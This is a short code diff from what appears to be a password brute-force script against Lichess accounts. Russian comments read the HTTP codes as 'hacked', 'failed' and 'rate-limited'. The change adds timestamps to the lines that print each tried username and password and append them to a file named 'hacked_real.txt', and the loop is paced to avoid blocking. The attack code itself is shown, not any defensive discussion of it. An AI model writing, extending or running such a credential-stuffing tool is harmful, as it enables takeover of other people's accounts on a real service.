@@ -59,10 +59,10 @@ def start(passwords):
 
     #       Выводим статус взлома
     #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
-            print(r, username, password)
+            print(f"{get_ts()} {r}, {username}: {password}")
             k += 1
 
-            with open("hacked_real.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{r}, {username}, {password}")
+            with open("hacked_real.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{get_ts()} {r}, {username}: {password}")
 
             time.sleep(5)
             if k % 10 == 0:
